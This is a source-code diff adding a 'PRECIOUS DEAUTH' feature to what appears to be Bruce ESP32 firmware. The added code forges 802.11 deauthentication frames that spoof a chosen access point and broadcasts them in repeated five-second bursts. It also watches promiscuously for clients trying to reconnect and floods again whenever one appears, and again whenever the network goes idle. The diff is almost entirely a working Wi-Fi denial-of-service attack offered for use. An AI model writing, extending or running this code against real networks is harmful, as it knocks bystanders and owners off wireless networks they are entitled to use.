@@ -57,6 +57,19 @@ static std::vector<Host> detectedClients;
 static uint8_t scanTargetBSSID[6];
 static bool clientScanActive = false;
 
+static constexpr size_t PASSIVE_MONITOR_MAX_CLIENTS = 8;
+struct PassiveMonitorClient {
+    uint8_t mac[6] = {};
+    uint8_t lastSubtype = 0;
+    int8_t rssi = 0;
+    uint32_t frameCount = 0;
+    uint32_t lastSeen = 0;
+};
+static PassiveMonitorClient passiveMonitorClients[PASSIVE_MONITOR_MAX_CLIENTS];
+static portMUX_TYPE passiveMonitorMux = portMUX_INITIALIZER_UNLOCKED;
+static bool passiveMonitorActive = false;
+static uint8_t passiveMonitorTargetBSSID[6] = {};
+
 // =============================================================================
 // Vendor OUI Lookup
 // =============================================================================
@@ -1079,6 +1092,321 @@ void clientSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
         }
     }
 }
+// PD
+
+void sendSingleDeauthPacket(const uint8_t *bssid, const uint8_t *destMac) {
+    uint8_t packet[26] = {
+        0xC0,
+        0x00,
+        0x00,
+        0x00,
+        destMac[0],
+        destMac[1],
+        destMac[2],
+        destMac[3],
+        destMac[4],
+        destMac[5],
+        // Addr 2: Source MAC (AP BSSID)
+        bssid[0],
+        bssid[1],
+        bssid[2],
+        bssid[3],
+        bssid[4],
+        bssid[5],
+        // Addr 3: BSSID (AP BSSID)
+        bssid[0],
+        bssid[1],
+        bssid[2],
+        bssid[3],
+        bssid[4],
+        bssid[5],
+        0x00,
+        0x00, // Sequence number
+        0x07,
+        0x00
+    };
+
+    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+}
+
+static void passiveAPMonitorCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (!buf || type != WIFI_PKT_MGMT) return;
+
+    wifi_promiscuous_pkt_t *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
+    if (pkt->rx_ctrl.sig_len < sizeof(wifi_header_t)) return;
+
+    const wifi_header_t *header = reinterpret_cast<const wifi_header_t *>(pkt->payload);
+    const uint8_t subtype = (pkt->payload[0] >> 4) & 0x0F;
+    const bool isConnectionFrame = subtype == 0x00 || subtype == 0x02 || subtype == 0x0B;
+    if (!isConnectionFrame ||
+        (memcmp(header->addr1, passiveMonitorTargetBSSID, 6) != 0 &&
+         memcmp(header->addr3, passiveMonitorTargetBSSID, 6) != 0) ||
+        memcmp(header->addr2, passiveMonitorTargetBSSID, 6) == 0 || (header->addr2[0] & 0x01)) {
+        return;
+    }
+
+    portENTER_CRITICAL(&passiveMonitorMux);
+    if (!passiveMonitorActive) {
+        portEXIT_CRITICAL(&passiveMonitorMux);
+        return;
+    }
+
+    PassiveMonitorClient *entry = nullptr;
+    PassiveMonitorClient *emptyEntry = nullptr;
+    for (auto &client : passiveMonitorClients) {
+        if (memcmp(client.mac, header->addr2, 6) == 0) {
+            entry = &client;
+            break;
+        }
+        if (!emptyEntry && client.frameCount == 0) emptyEntry = &client;
+    }
+    if (!entry) entry = emptyEntry;
+    if (entry) {
+        if (entry->frameCount == 0) memcpy(entry->mac, header->addr2, 6);
+        entry->lastSubtype = subtype;
+        entry->rssi = pkt->rx_ctrl.rssi;
+        entry->frameCount++;
+        entry->lastSeen = millis();
+    }
+    portEXIT_CRITICAL(&passiveMonitorMux);
+}
+
+bool deauthPaused = false;
+
+void printDeauthStatuss() {
+    tft.setTextSize(FP);
+
+    int yPos = tftHeight - BORDER_PAD_X - FP * LH;
+    int boxWidth = 150;
+    int boxHeight = FP * LH * 1.2; // Tinggi area teks
+    int xPos = tftWidth - BORDER_PAD_X - boxWidth;
+
+    tft.fillRect(xPos, yPos, boxWidth, boxHeight, TFT_BLACK);
+
+    if (deauthPaused) {
+        tft.setTextColor(bruceConfig.priColor);
+        tft.drawRightString("Deauth OFF", tftWidth - BORDER_PAD_X, yPos, SMOOTH_FONT);
+    } else {
+        tft.setTextColor(TFT_RED);
+        tft.drawRightString("Deauth ON", tftWidth - BORDER_PAD_X, yPos, SMOOTH_FONT);
+        tft.setTextColor(bruceConfig.priColor); // Kembalikan warna default
+    }
+}
+
+void passiveAPClientMonitor(const String &apSSID, const uint8_t *targetMAC, uint8_t channel) {
+    if (!targetMAC || channel == 0) {
+        displayError("Invalid AP target", true);
+        return;
+    }
+
+    unsigned long lastRedraw = 0;
+    unsigned long lastClientSeen = millis();
+    const char *monitorError = nullptr;
+
+    WiFiState savedState = saveWiFiState();
+    wifiDisconnect();
+    if (!WiFi.mode(WIFI_MODE_STA)) {
+        displayError("Failed to start WiFi monitor", true);
+        restoreWiFiState(savedState);
+        return;
+    }
+
+    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    if (err != ESP_OK) {
+        displayError("Failed to set AP channel", true);
+        restoreWiFiState(savedState);
+        return;
+    }
+
+    portENTER_CRITICAL(&passiveMonitorMux);
+    memset(passiveMonitorClients, 0, sizeof(passiveMonitorClients));
+    memcpy(passiveMonitorTargetBSSID, targetMAC, sizeof(passiveMonitorTargetBSSID));
+    passiveMonitorActive = true;
+    portEXIT_CRITICAL(&passiveMonitorMux);
+
+    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT};
+    err = esp_wifi_set_promiscuous_filter(&filter);
+    if (err == ESP_OK) err = esp_wifi_set_promiscuous_rx_cb(passiveAPMonitorCallback);
+    if (err == ESP_OK) err = esp_wifi_set_promiscuous(true);
+    if (err != ESP_OK) {
+        portENTER_CRITICAL(&passiveMonitorMux);
+        passiveMonitorActive = false;
+        portEXIT_CRITICAL(&passiveMonitorMux);
+        esp_wifi_set_promiscuous(false);
+        esp_wifi_set_promiscuous_rx_cb(nullptr);
+        restoreWiFiState(savedState);
+        displayError("Failed to start passive monitor", true);
+        return;
+    }
+
+    drawMainBorderWithTitle("PRECIOUS DEAUTH");
+    tft.setTextSize(FP);
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.setCursor(10, 46);
+    tft.printf("AP: %s", apSSID.c_str());
+    tft.setCursor(10, 60);
+    tft.printf(
+        "MAC: %02X:%02X:%02X:%02X:%02X:%02X",
+        targetMAC[0],
+        targetMAC[1],
+        targetMAC[2],
+        targetMAC[3],
+        targetMAC[4],
+        targetMAC[5]
+    );
+    tft.setCursor(10, 74);
+    tft.printf("Channel: %u", channel);
+
+    tft.setCursor(10, tftHeight - 18);
+    tft.print("Press BACK to stop");
+
+    printDeauthStatuss();
+
+    // --- INISIASI DEAUTH AWAL (DIPERPANJANG UNTUK TARGET JAUH) ---
+    uint8_t broadcastMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    unsigned long initialDeauthStart = millis();
+
+    // Kirim paket deauth secara terus-menerus selama 2 detik di awal
+    while (millis() - initialDeauthStart < 5000) {
+        if (check(EscPress)) break;
+        sendSingleDeauthPacket(targetMAC, broadcastMAC);
+        delay(20); // Jeda 20ms antar paket agar stabil dan tidak membuat buffer Wi-Fi penuh/crash
+    }
+    // -----------------------------------------------------------
+
+    PassiveMonitorClient snapshot[PASSIVE_MONITOR_MAX_CLIENTS];
+
+    struct ClientDeauthRecord {
+        uint8_t mac[6];
+        unsigned long lastDeauthTime;
+    };
+    ClientDeauthRecord deauthRecords[PASSIVE_MONITOR_MAX_CLIENTS] = {};
+
+    while (!check(EscPress)) {
+        if (check(SelPress)) {
+            deauthPaused = !deauthPaused;
+            printDeauthStatuss();
+            lastRedraw = 0;
+        }
+
+        unsigned long currentMillis = millis();
+        if (currentMillis - lastRedraw >= 250) {
+            lastRedraw = currentMillis;
+            portENTER_CRITICAL(&passiveMonitorMux);
+            memcpy(snapshot, passiveMonitorClients, sizeof(snapshot));
+            portEXIT_CRITICAL(&passiveMonitorMux);
+
+            // Cari klien dengan timestamp 'lastSeen' paling baru
+            PassiveMonitorClient *latestClient = nullptr;
+            unsigned long maxLastSeen = 0;
+
+            for (int i = 0; i < PASSIVE_MONITOR_MAX_CLIENTS; i++) {
+                if (snapshot[i].frameCount == 0) continue;
+                if (snapshot[i].lastSeen > maxLastSeen) {
+                    maxLastSeen = snapshot[i].lastSeen;
+                    latestClient = &snapshot[i];
+                }
+            }
+
+            tft.fillRect(6, 88, tftWidth - 12, tftHeight - 114, bruceConfig.bgColor);
+
+            if (latestClient) {
+                // Cek apakah klien ini mengirim request baru (lastSeen berubah / belum pernah / sudah lewat
+                // jeda cooldown misal 2 detik)
+                bool shouldDeauth = false;
+                int recordIdx = -1;
+
+                for (int i = 0; i < PASSIVE_MONITOR_MAX_CLIENTS; i++) {
+                    if (deauthRecords[i].mac[0] == 0 && deauthRecords[i].mac[1] == 0) {
+                        recordIdx = i; // Slot kosong
+                        break;
+                    }
+                    if (memcmp(deauthRecords[i].mac, latestClient->mac, 6) == 0) {
+                        recordIdx = i;
+                        break;
+                    }
+                }
+
+                if (recordIdx != -1) {
+                    // Jika belum pernah di-record atau sudah lewat 2 detik sejak deauth terakhir untuk klien
+                    // ini
+                    if (deauthRecords[recordIdx].lastDeauthTime == 0 ||
+                        (millis() - deauthRecords[recordIdx].lastDeauthTime > 2000)) {
+                        shouldDeauth = true;
+                    }
+                }
+
+                // Jika aktif dan belum di-pause, kirim deauth setiap kali klien mencoba connect lagi
+                if (shouldDeauth && !deauthPaused) {
+                    unsigned long secondDeauthStart = millis();
+                    while (millis() - secondDeauthStart < 5000) {
+                        if (check(EscPress)) break;
+                        sendSingleDeauthPacket(targetMAC, broadcastMAC);
+                        delay(20);
+                    }
+                    memcpy(deauthRecords[recordIdx].mac, latestClient->mac, 6);
+                    deauthRecords[recordIdx].lastDeauthTime = millis();
+                }
+
+                char mac[18];
+                snprintf(
+                    mac,
+                    sizeof(mac),
+                    "%02X:%02X:%02X:%02X:%02X:%02X",
+                    latestClient->mac[0],
+                    latestClient->mac[1],
+                    latestClient->mac[2],
+                    latestClient->mac[3],
+                    latestClient->mac[4],
+                    latestClient->mac[5]
+                );
+                const char *frameName = latestClient->lastSubtype == 0x00   ? "Assoc"
+                                        : latestClient->lastSubtype == 0x02 ? "Reassoc"
+                                                                            : "Auth";
+
+                // Tampilkan 1 klien terakhir di layar
+                tft.setCursor(10, 100);
+                tft.print("Last Client Attempt:");
+                tft.setCursor(10, 114);
+                tft.printf("MAC: %s", mac);
+                tft.setCursor(10, 128);
+                tft.printf("Type: %s | RSSI: %ddBm", frameName, latestClient->rssi);
+                tft.setCursor(10, 142);
+                tft.printf("Frames: %lu", static_cast<unsigned long>(latestClient->frameCount));
+            } else {
+                // --- CEK IDLE 10 DETIK: JIKA TIDAK ADA KLIEN, EKSEKUSI ULANG DEAUTH AWAL ---
+                if (!deauthPaused && (currentMillis - lastClientSeen >= 15000)) {
+                    lastClientSeen = currentMillis;
+                    tft.fillRect(6, 120, tftWidth - 12, 16, bruceConfig.bgColor);
+                    tft.setCursor(10, 120);
+                    tft.print("Re-Deauth (5s)");
+
+                    unsigned long reDeauthStart = millis();
+                    while (millis() - reDeauthStart < 5000) {
+                        if (check(EscPress)) break;
+                        sendSingleDeauthPacket(targetMAC, broadcastMAC);
+                        delay(20);
+                    }
+                    tft.fillRect(6, 120, tftWidth - 12, 16, bruceConfig.bgColor);
+                }
+                tft.setCursor(10, 120);
+                tft.print("Waiting for client requests...");
+            }
+        }
+        vTaskDelay(pdMS_TO_TICKS(20));
+    }
+
+    portENTER_CRITICAL(&passiveMonitorMux);
+    passiveMonitorActive = false;
+    portEXIT_CRITICAL(&passiveMonitorMux);
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+    restoreWiFiState(savedState);
+    returnToMenu = false;
+    if (monitorError) displayError(monitorError, true);
+}
+
+// PD
 
 void scanClientsOnAP(uint8_t *targetMAC, int channel) {
     WiFiState savedState = saveWiFiState();
